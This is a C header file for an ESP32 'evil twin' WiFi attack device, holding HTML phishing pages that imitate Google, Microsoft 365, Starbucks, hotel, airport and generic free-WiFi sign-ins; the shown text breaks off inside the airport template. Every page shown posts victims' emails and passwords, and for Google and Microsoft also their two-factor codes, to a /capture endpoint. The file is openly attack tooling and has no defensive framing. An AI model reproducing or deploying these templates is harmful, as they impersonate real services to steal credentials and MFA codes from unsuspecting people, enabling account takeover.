#ifndef PORTAL_PAGES_H
#define PORTAL_PAGES_H

// ═══════════════════════════════════════════════════════════════════════════
// GARMR-Style Evil Twin Portal Templates
// Ported from WiFi Pineapple Pager GARMR payloads for ESP32 CYD
// 9 portal templates: WiFi, Google, Microsoft, Starbucks, Hotel, Airport,
//                     ATT, McDonalds, Xfinity
// Created: 2026-02-14
// ═══════════════════════════════════════════════════════════════════════════

#include <pgmspace.h>

// ═══════════════════════════════════════════════════════════════════════════
// Template display names (for CYD screen)
// ═══════════════════════════════════════════════════════════════════════════

static const char* const portalTemplateNames[] = {
    "WiFi", "Google", "Microsoft", "Starbucks", "Hotel", "Airport",
    "ATT", "McDonalds", "Xfinity", "FW Update", "Reconnect"
};

// ═══════════════════════════════════════════════════════════════════════════
// TEMPLATE 0: GENERIC WIFI - Single stage (email + password)
// Purple gradient, WiFi emoji, "Free WiFi Access"
// ═══════════════════════════════════════════════════════════════════════════

const char portal_wifi[] PROGMEM = R"pg(<!DOCTYPE html>
<html>
<head>
<title>Free WiFi - Sign In</title>
<meta name='viewport' content='width=device-width, initial-scale=1'>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);min-height:100vh;display:flex;align-items:center;justify-content:center}
.c{background:#fff;width:380px;padding:40px;border-radius:12px;box-shadow:0 20px 60px rgba(0,0,0,.3)}
.w{font-size:48px;text-align:center;margin-bottom:16px}
h1{font-size:24px;text-align:center;margin-bottom:8px;color:#333}
.s{text-align:center;color:#666;margin-bottom:32px;font-size:14px}
input{width:100%;padding:14px 16px;font-size:16px;border:2px solid #e1e1e1;border-radius:8px;margin-bottom:16px;outline:none}
input:focus{border-color:#667eea}
.b{width:100%;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:#fff;border:none;padding:14px;font-size:16px;font-weight:600;cursor:pointer;border-radius:8px}
.t{font-size:12px;color:#999;text-align:center;margin-top:16px}
</style>
</head>
<body>
<div class='c'>
<div class='w'>&#128246;</div>
<h1>Free WiFi Access</h1>
<p class='s'>Sign in with your email to connect</p>
<form method='POST' action='/capture'>
<input type='email' name='email' placeholder='Email address' required>
<input type='password' name='password' placeholder='Create a password'>
<button type='submit' class='b'>Connect to WiFi</button>
</form>
<p class='t'>By connecting, you agree to our Terms of Service</p>
</div>
</body>
</html>)pg";

// ═══════════════════════════════════════════════════════════════════════════
// TEMPLATE 1: GOOGLE - Stage 1 (Email)
// White background, Google SVG logo, "Sign in"
// ═══════════════════════════════════════════════════════════════════════════

const char portal_google_email[] PROGMEM = R"pg(<!DOCTYPE html>
<html>
<head>
<title>Sign in - Google Accounts</title>
<meta name='viewport' content='width=device-width, initial-scale=1'>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Google Sans',Roboto,Arial,sans-serif;background:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center}
.c{width:450px;padding:48px 40px 36px;border:1px solid #dadce0;border-radius:8px}
.l{width:75px;margin:0 auto 16px;display:block}
h1{font-size:24px;font-weight:400;text-align:center;margin-bottom:8px;color:#202124}
.s{text-align:center;font-size:16px;color:#5f6368;margin-bottom:32px}
input[type="email"]{width:100%;padding:13px 15px;font-size:16px;border:1px solid #dadce0;border-radius:4px;margin-bottom:8px;outline:none}
input:focus{border:2px solid #1a73e8;padding:12px 14px}
.il{font-size:12px;color:#5f6368;margin-bottom:24px;display:block}
.b{background:#1a73e8;color:#fff;border:none;padding:10px 24px;font-size:14px;font-weight:500;cursor:pointer;border-radius:4px;float:right}
.lk{color:#1a73e8;text-decoration:none;font-size:14px;font-weight:500}
.f{display:flex;justify-content:space-between;margin-top:32px;clear:both;padding-top:24px}
</style>
</head>
<body>
<div class='c'>
<svg class='l' viewBox='0 0 272 92' xmlns='http://www.w3.org/2000/svg'><path fill='#4285F4' d='M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z'/><path fill='#EA4335' d='M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z'/><path fill='#FBBC05' d='M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z'/><path fill='#4285F4' d='M225 3v65h-9.5V3h9.5z'/><path fill='#34A853' d='M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z'/><path fill='#4285F4' d='M35.29 41.41V32H67c.31 1.64.47 3.58.47 5.68 0 7.06-1.93 15.79-8.15 22.01-6.05 6.3-13.78 9.66-24.02 9.66C16.32 69.35.36 53.89.36 34.91.36 15.93 16.32.47 35.3.47c10.5 0 17.98 4.12 23.6 9.49l-6.64 6.64c-4.03-3.78-9.49-6.72-16.97-6.72-13.86 0-24.7 11.17-24.7 25.03 0 13.86 10.84 25.03 24.7 25.03 8.99 0 14.11-3.61 17.39-6.89 2.66-2.66 4.41-6.46 5.1-11.65l-22.49.01z'/></svg>
<h1>Sign in</h1>
<p class='s'>Use your Google Account</p>
<form method='POST' action='/capture'>
<input type='hidden' name='stage' value='email'>
<input type='email' name='email' placeholder='Email or phone' required autofocus>
<span class='il'><a href='#' class='lk'>Forgot email?</a></span>
<div class='f'>
<a href='#' class='lk'>Create account</a>
<button type='submit' class='b'>Next</button>
</div>
</form>
</div>
</body>
</html>)pg";

// ═══════════════════════════════════════════════════════════════════════════
// TEMPLATE 1: GOOGLE - Stage 2 (Password)
// Shows {{EMAIL}} in chip, password input
// ═══════════════════════════════════════════════════════════════════════════

const char portal_google_password[] PROGMEM = R"pg(<!DOCTYPE html>
<html>
<head>
<title>Sign in - Google Accounts</title>
<meta name='viewport' content='width=device-width, initial-scale=1'>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Google Sans',Roboto,Arial,sans-serif;background:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center}
.c{width:450px;padding:48px 40px 36px;border:1px solid #dadce0;border-radius:8px}
.l{width:75px;margin:0 auto 16px;display:block}
h1{font-size:24px;font-weight:400;text-align:center;margin-bottom:8px;color:#202124}
.ec{background:#f1f3f4;border-radius:16px;padding:4px 12px;display:inline-block;margin-bottom:24px;font-size:14px;color:#3c4043}
input[type="password"]{width:100%;padding:13px 15px;font-size:16px;border:1px solid #dadce0;border-radius:4px;margin-bottom:8px;outline:none}
input:focus{border:2px solid #1a73e8;padding:12px 14px}
.il{font-size:12px;color:#5f6368;margin-bottom:24px;display:block}
.b{background:#1a73e8;color:#fff;border:none;padding:10px 24px;font-size:14px;font-weight:500;cursor:pointer;border-radius:4px;float:right}
.lk{color:#1a73e8;text-decoration:none;font-size:14px;font-weight:500}
.f{display:flex;justify-content:space-between;margin-top:32px;clear:both;padding-top:24px}
</style>
</head>
<body>
<div class='c'>
<svg class='l' viewBox='0 0 272 92' xmlns='http://www.w3.org/2000/svg'><path fill='#4285F4' d='M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z'/><path fill='#EA4335' d='M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z'/><path fill='#FBBC05' d='M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z'/><path fill='#4285F4' d='M225 3v65h-9.5V3h9.5z'/><path fill='#34A853' d='M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z'/><path fill='#4285F4' d='M35.29 41.41V32H67c.31 1.64.47 3.58.47 5.68 0 7.06-1.93 15.79-8.15 22.01-6.05 6.3-13.78 9.66-24.02 9.66C16.32 69.35.36 53.89.36 34.91.36 15.93 16.32.47 35.3.47c10.5 0 17.98 4.12 23.6 9.49l-6.64 6.64c-4.03-3.78-9.49-6.72-16.97-6.72-13.86 0-24.7 11.17-24.7 25.03 0 13.86 10.84 25.03 24.7 25.03 8.99 0 14.11-3.61 17.39-6.89 2.66-2.66 4.41-6.46 5.1-11.65l-22.49.01z'/></svg>
<h1>Welcome</h1>
<div class='ec'>{{EMAIL}}</div>
<form method='POST' action='/capture'>
<input type='hidden' name='stage' value='password'>
<input type='hidden' name='email' value='{{EMAIL}}'>
<input type='password' name='password' placeholder='Enter your password' required autofocus>
<span class='il'><a href='#' class='lk'>Forgot password?</a></span>
<div class='f'>
<span></span>
<button type='submit' class='b'>Next</button>
</div>
</form>
</div>
</body>
</html>)pg";

// ═══════════════════════════════════════════════════════════════════════════
// TEMPLATE 1: GOOGLE - Stage 3 (MFA)
// 2-Step Verification, 6-digit code input
// ═══════════════════════════════════════════════════════════════════════════

const char portal_google_mfa[] PROGMEM = R"pg(<!DOCTYPE html>
<html>
<head>
<title>2-Step Verification</title>
<meta name='viewport' content='width=device-width, initial-scale=1'>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Google Sans',Roboto,Arial,sans-serif;background:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center}
.c{width:450px;padding:48px 40px 36px;border:1px solid #dadce0;border-radius:8px}
.l{width:75px;margin:0 auto 16px;display:block}
h1{font-size:24px;font-weight:400;text-align:center;margin-bottom:8px;color:#202124}
.m{font-size:14px;color:#5f6368;margin-bottom:24px;line-height:1.5}
.mc{letter-spacing:12px;font-size:28px;text-align:center;font-weight:500;width:100%;padding:13px 15px;border:1px solid #dadce0;border-radius:4px;margin-bottom:8px;outline:none}
.mc:focus{border:2px solid #1a73e8;padding:12px 14px}
.il{font-size:12px;color:#5f6368;margin-bottom:24px;display:block}
.b{background:#1a73e8;color:#fff;border:none;padding:10px 24px;font-size:14px;font-weight:500;cursor:pointer;border-radius:4px;float:right}
.lk{color:#1a73e8;text-decoration:none;font-size:14px;font-weight:500}
.f{display:flex;justify-content:space-between;margin-top:32px;clear:both;padding-top:24px}
</style>
</head>
<body>
<div class='c'>
<svg class='l' viewBox='0 0 272 92' xmlns='http://www.w3.org/2000/svg'><path fill='#4285F4' d='M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z'/><path fill='#EA4335' d='M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z'/><path fill='#FBBC05' d='M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z'/><path fill='#4285F4' d='M225 3v65h-9.5V3h9.5z'/><path fill='#34A853' d='M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z'/><path fill='#4285F4' d='M35.29 41.41V32H67c.31 1.64.47 3.58.47 5.68 0 7.06-1.93 15.79-8.15 22.01-6.05 6.3-13.78 9.66-24.02 9.66C16.32 69.35.36 53.89.36 34.91.36 15.93 16.32.47 35.3.47c10.5 0 17.98 4.12 23.6 9.49l-6.64 6.64c-4.03-3.78-9.49-6.72-16.97-6.72-13.86 0-24.7 11.17-24.7 25.03 0 13.86 10.84 25.03 24.7 25.03 8.99 0 14.11-3.61 17.39-6.89 2.66-2.66 4.41-6.46 5.1-11.65l-22.49.01z'/></svg>
<h1>2-Step Verification</h1>
<p class='m'>Enter the verification code from your phone.</p>
<form method='POST' action='/capture'>
<input type='hidden' name='stage' value='mfa'>
<input type='hidden' name='email' value='{{EMAIL}}'>
<input type='text' name='mfa_code' class='mc' placeholder='G-' maxlength='6' pattern='[0-9]{6}' required autofocus>
<span class='il'><a href='#' class='lk'>Try another way</a></span>
<div class='f'>
<span></span>
<button type='submit' class='b'>Next</button>
</div>
</form>
</div>
</body>
</html>)pg";

// ═══════════════════════════════════════════════════════════════════════════
// TEMPLATE 2: MICROSOFT 365 - Stage 1 (Email)
// Gray background, MS 4-color logo, "Sign in"
// ═══════════════════════════════════════════════════════════════════════════

const char portal_microsoft_email[] PROGMEM = R"pg(<!DOCTYPE html>
<html>
<head>
<title>Sign in to your account</title>
<meta name='viewport' content='width=device-width, initial-scale=1'>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',sans-serif;background:#f2f2f2;min-height:100vh;display:flex;align-items:center;justify-content:center}
.c{background:#fff;width:440px;padding:44px;box-shadow:0 2px 6px rgba(0,0,0,.2)}
.l{width:108px;margin-bottom:16px}
h1{font-size:24px;font-weight:600;margin-bottom:12px;color:#1b1b1b}
input[type="email"]{width:100%;padding:10px 8px;font-size:15px;border:1px solid #666;margin-bottom:16px;outline:none}
input:focus{border-color:#0067b8}
.b{background:#0067b8;color:#fff;border:none;padding:10px 20px;font-size:15px;cursor:pointer;float:right}
.lk{color:#0067b8;text-decoration:none;font-size:13px;display:block;margin-bottom:8px}
</style>
</head>
<body>
<div class='c'>
<img src='data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDgiIGhlaWdodD0iMjQiPjxwYXRoIGZpbGw9IiNmMjUwMjIiIGQ9Ik0wIDBoMTEuNXYxMS41SDB6Ii8+PHBhdGggZmlsbD0iIzdmYmEwMCIgZD0iTTEyLjUgMEgyNHYxMS41SDEyLjV6Ii8+PHBhdGggZmlsbD0iIzAwYTRlZiIgZD0iTTAgMTIuNWgxMS41VjI0SDB6Ii8+PHBhdGggZmlsbD0iI2ZmYjkwMCIgZD0iTTEyLjUgMTIuNUgyNFYyNEgxMi41eiIvPjwvc3ZnPg==' class='l' alt='Microsoft'>
<h1>Sign in</h1>
<form method='POST' action='/capture'>
<input type='hidden' name='stage' value='email'>
<input type='email' name='email' placeholder='Email, phone, or Skype' required autofocus>
<a href='#' class='lk'>Can't access your account?</a>
<a href='#' class='lk'>Sign-in options</a>
<button type='submit' class='b'>Next</button>
</form>
</div>
</body>
</html>)pg";

// ═══════════════════════════════════════════════════════════════════════════
// TEMPLATE 2: MICROSOFT 365 - Stage 2 (Password)
// Shows {{EMAIL}}, password input
// ═══════════════════════════════════════════════════════════════════════════

const char portal_microsoft_password[] PROGMEM = R"pg(<!DOCTYPE html>
<html>
<head>
<title>Sign in to your account</title>
<meta name='viewport' content='width=device-width, initial-scale=1'>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',sans-serif;background:#f2f2f2;min-height:100vh;display:flex;align-items:center;justify-content:center}
.c{background:#fff;width:440px;padding:44px;box-shadow:0 2px 6px rgba(0,0,0,.2)}
.l{width:108px;margin-bottom:16px}
h1{font-size:24px;font-weight:600;margin-bottom:12px;color:#1b1b1b}
.ed{font-size:14px;color:#666;margin-bottom:24px}
input[type="password"]{width:100%;padding:10px 8px;font-size:15px;border:1px solid #666;margin-bottom:16px;outline:none}
input:focus{border-color:#0067b8}
.b{background:#0067b8;color:#fff;border:none;padding:10px 20px;font-size:15px;cursor:pointer;float:right}
.lk{color:#0067b8;text-decoration:none;font-size:13px;display:block;margin-bottom:8px}
</style>
</head>
<body>
<div class='c'>
<img src='data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDgiIGhlaWdodD0iMjQiPjxwYXRoIGZpbGw9IiNmMjUwMjIiIGQ9Ik0wIDBoMTEuNXYxMS41SDB6Ii8+PHBhdGggZmlsbD0iIzdmYmEwMCIgZD0iTTEyLjUgMEgyNHYxMS41SDEyLjV6Ii8+PHBhdGggZmlsbD0iIzAwYTRlZiIgZD0iTTAgMTIuNWgxMS41VjI0SDB6Ii8+PHBhdGggZmlsbD0iI2ZmYjkwMCIgZD0iTTEyLjUgMTIuNUgyNFYyNEgxMi41eiIvPjwvc3ZnPg==' class='l' alt='Microsoft'>
<div class='ed'>{{EMAIL}}</div>
<h1>Enter password</h1>
<form method='POST' action='/capture'>
<input type='hidden' name='stage' value='password'>
<input type='hidden' name='email' value='{{EMAIL}}'>
<input type='password' name='password' placeholder='Password' required autofocus>
<a href='#' class='lk'>Forgot my password</a>
<button type='submit' class='b'>Sign in</button>
</form>
</div>
</body>
</html>)pg";

// ═══════════════════════════════════════════════════════════════════════════
// TEMPLATE 2: MICROSOFT 365 - Stage 3 (MFA)
// Verify identity, 6-digit code
// ═══════════════════════════════════════════════════════════════════════════

const char portal_microsoft_mfa[] PROGMEM = R"pg(<!DOCTYPE html>
<html>
<head>
<title>Verify your identity</title>
<meta name='viewport' content='width=device-width, initial-scale=1'>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',sans-serif;background:#f2f2f2;min-height:100vh;display:flex;align-items:center;justify-content:center}
.c{background:#fff;width:440px;padding:44px;box-shadow:0 2px 6px rgba(0,0,0,.2)}
.l{width:108px;margin-bottom:16px}
h1{font-size:24px;font-weight:600;margin-bottom:12px;color:#1b1b1b}
.m{font-size:13px;color:#666;margin-bottom:16px;line-height:1.5}
.mc{letter-spacing:8px;font-size:24px;text-align:center;width:100%;padding:10px 8px;border:1px solid #666;margin-bottom:16px;outline:none}
.mc:focus{border-color:#0067b8}
.b{background:#0067b8;color:#fff;border:none;padding:10px 20px;font-size:15px;cursor:pointer;float:right}
.lk{color:#0067b8;text-decoration:none;font-size:13px;display:block;margin-bottom:8px}
</style>
</head>
<body>
<div class='c'>
<img src='data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDgiIGhlaWdodD0iMjQiPjxwYXRoIGZpbGw9IiNmMjUwMjIiIGQ9Ik0wIDBoMTEuNXYxMS41SDB6Ii8+PHBhdGggZmlsbD0iIzdmYmEwMCIgZD0iTTEyLjUgMEgyNHYxMS41SDEyLjV6Ii8+PHBhdGggZmlsbD0iIzAwYTRlZiIgZD0iTTAgMTIuNWgxMS41VjI0SDB6Ii8+PHBhdGggZmlsbD0iI2ZmYjkwMCIgZD0iTTEyLjUgMTIuNUgyNFYyNEgxMi41eiIvPjwvc3ZnPg==' class='l' alt='Microsoft'>
<h1>Verify your identity</h1>
<p class='m'>Enter the code from your authenticator app or SMS.</p>
<form method='POST' action='/capture'>
<input type='hidden' name='stage' value='mfa'>
<input type='hidden' name='email' value='{{EMAIL}}'>
<input type='text' name='mfa_code' class='mc' placeholder='______' maxlength='6' pattern='[0-9]{6}' required autofocus>
<a href='#' class='lk'>I can't use my authenticator app right now</a>
<button type='submit' class='b'>Verify</button>
</form>
</div>
</body>
</html>)pg";

// ═══════════════════════════════════════════════════════════════════════════
// TEMPLATE 3: STARBUCKS - Single stage (email + password)
// Green gradient, SVG logo, rewards branding
// ═══════════════════════════════════════════════════════════════════════════

const char portal_starbucks[] PROGMEM = R"pg(<!DOCTYPE html>
<html>
<head>
<title>Starbucks WiFi</title>
<meta name='viewport' content='width=device-width, initial-scale=1'>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:linear-gradient(135deg,#1e3932 0%,#00704A 100%);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.c{background:#fff;padding:40px;border-radius:16px;max-width:400px;width:100%;box-shadow:0 20px 60px rgba(0,0,0,.3);text-align:center}
.lg{width:100px;height:100px;margin:0 auto 20px}
h1{color:#1e3932;font-size:24px;margin-bottom:8px;font-weight:600}
.s{color:#666;margin-bottom:30px;font-size:14px}
.fg{margin-bottom:16px;text-align:left}
label{display:block;color:#1e3932;font-size:14px;margin-bottom:6px;font-weight:500}
input{width:100%;padding:14px 16px;border:2px solid #e0e0e0;border-radius:8px;font-size:16px}
input:focus{outline:none;border-color:#00704A}
button{width:100%;padding:16px;background:#00704A;color:#fff;border:none;border-radius:25px;font-size:16px;font-weight:600;cursor:pointer;margin-top:10px}
.r{margin-top:20px;padding-top:20px;border-top:1px solid #e0e0e0;font-size:13px;color:#666}
.r strong{color:#00704A}
</style>
</head>
<body>
<div class='c'>
<div class='lg'>
<svg viewBox='0 0 100 100' xmlns='http://www.w3.org/2000/svg'>
<circle cx='50' cy='50' r='48' fill='#00704A'/>
<circle cx='50' cy='50' r='42' fill='none' stroke='#fff' stroke-width='2'/>
<circle cx='50' cy='50' r='38' fill='none' stroke='#fff' stroke-width='1'/>
<polygon points='50,20 54,36 72,36 58,46 63,62 50,52 37,62 42,46 28,36 46,36' fill='#fff'/>
</svg>
</div>
<h1>Starbucks WiFi</h1>
<p class='s'>Sign in to connect to free WiFi</p>
<form method='POST' action='/capture'>
<div class='fg'>
<label>Email Address</label>
<input type='email' name='email' required placeholder='Enter your email'>
</div>
<div class='fg'>
<label>Password</label>
<input type='password' name='password' required placeholder='Enter your password'>
</div>
<button type='submit'>Connect to WiFi</button>
</form>
<div class='r'>
<strong>Starbucks Rewards</strong> members get free refills on brewed coffee and tea
</div>
</div>
</body>
</html>)pg";

// ═══════════════════════════════════════════════════════════════════════════
// TEMPLATE 4: HOTEL - Single stage (room + email + password)
// Purple gradient, hotel SVG icon, amenities
// ═══════════════════════════════════════════════════════════════════════════

const char portal_hotel[] PROGMEM = R"pg(<!DOCTYPE html>
<html>
<head>
<title>Hotel Guest WiFi</title>
<meta name='viewport' content='width=device-width, initial-scale=1'>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:linear-gradient(135deg,#44337a 0%,#6b46c1 50%,#9f7aea 100%);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
.c{background:#fff;border-radius:16px;padding:40px;max-width:400px;width:100%;box-shadow:0 20px 60px rgba(0,0,0,.3);text-align:center}
.lg{width:100px;height:100px;margin:0 auto 20px}
h1{color:#44337a;font-size:22px;margin-bottom:8px;font-weight:600}
.s{color:#666;margin-bottom:30px;font-size:14px}
.fg{margin-bottom:16px;text-align:left}
label{display:block;color:#44337a;font-weight:500;margin-bottom:6px;font-size:14px}
input{width:100%;padding:14px 16px;border:2px solid #e0e0e0;border-radius:8px;font-size:16px}
input:focus{outline:none;border-color:#6b46c1}
button{width:100%;padding:16px;background:linear-gradient(135deg,#6b46c1 0%,#9f7aea 100%);color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer;margin-top:10px}
.a{margin-top:20px;padding:15px;background:#FAF5FF;border-radius:8px;font-size:13px;color:#44337a}
.t{margin-top:20px;font-size:11px;color:#999;line-height:1.5}
</style>
</head>
<body>
<div class='c'>
<div class='lg'>
<svg viewBox='0 0 100 100' xmlns='http://www.w3.org/2000/svg'>
<rect x='20' y='30' width='60' height='60' fill='#6b46c1' rx='4'/>
<rect x='25' y='35' width='50' height='50' fill='#44337a' rx='2'/>
<rect x='30' y='40' width='10' height='10' fill='#FFF8E7' rx='1'/>
<rect x='45' y='40' width='10' height='10' fill='#FFF8E7' rx='1'/>
<rect x='60' y='40' width='10' height='10' fill='#FFF8E7' rx='1'/>
<rect x='30' y='55' width='10' height='10' fill='#FFF8E7' rx='1'/>
<rect x='45' y='55' width='10' height='10' fill='#9f7aea' rx='1'/>
<rect x='60' y='55' width='10' height='10' fill='#FFF8E7' rx='1'/>
<rect x='42' y='70' width='16' height='20' fill='#9f7aea' rx='2'/>
<circle cx='55' cy='80' r='1.5' fill='#FFD700'/>
<rect x='35' y='25' width='30' height='8' fill='#9f7aea' rx='2'/>
</svg>
</div>
<h1>Hotel Guest WiFi</h1>
<p class='s'>Welcome! Connect to complimentary WiFi</p>
<form method='POST' action='/capture'>
<div class='fg'>
<label>Room Number</label>
<input type='text' name='room' placeholder='e.g. 412' required>
</div>
<div class='fg'>
<label>Email Address</label>
<input type='email' name='email' placeholder='your@email.com' required>
</div>
<div class='fg'>
<label>Password</label>
<input type='password' name='password' placeholder='Password' required>
</div>
<button type='submit'>Connect to Guest WiFi</button>
</form>
<div class='a'>
<strong>Guest Amenities:</strong> Pool, Breakfast, Parking, Gym, Concierge, Laundry
</div>
<p class='t'>By connecting, you agree to the Hotel's Terms of Service. WiFi is complimentary for registered guests.</p>
</div>
</body>
</html>)pg";

// ═══════════════════════════════════════════════════════════════════════════
// TEMPLATE 5: AIRPORT - Single stage (email + password)
// Blue gradient, airplane SVG icon, traveler info
// ═══════════════════════════════════════════════════════════════════════════

const char portal_airport[] PROGMEM = R"pg(<!DOCTYPE html>
<html>
<head>
<title>Airport Free WiFi</title>
<meta name='viewport' content='width=device-width, initial-scale=1'>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:linear-gradient(135deg,#1a365d 0%,#2c5282 50%,#4299e1 100%);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
.c{background:#fff;border-radius:16px;padding:40px;max-width:400px;width:100%;box-shadow:0 20px 60px rgba(0,0,0,.3);text-align:center}
.lg{width:100px;height:100px;margin:0 auto 20px}
h1{color:#1a365d;font-size:22px;margin-bottom:8px;font-weight:600}
.s{color:#666;margin-bottom:30px;font-size:14px}
.fg{margin-bottom:16px;text-align:left}
label{display:block;color:#1a365d;font-weight:500;margin-bottom:6px;font-size:14px}
input{width:100%;padding:14px 16px;border:2px solid #e0e0e0;border-radius:8px;font-size:16px}
input:focus{outline:none;border-color:#4299e1}
button{width:100%;padding:16px;background:#2c5282;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer;margin-top:10px}
.i{margin-top:20px;padding:15px;background:#EBF8FF;border-radius:8px;font-size:13px;color:#2c5282;border-left:4px solid #4299e1;text-align:left}
.t{margin-top:20px;font-size:11px;color:#999;line-height:1.5}
</style>
</head>
<body>
<div class='c'>
<div class='lg'>
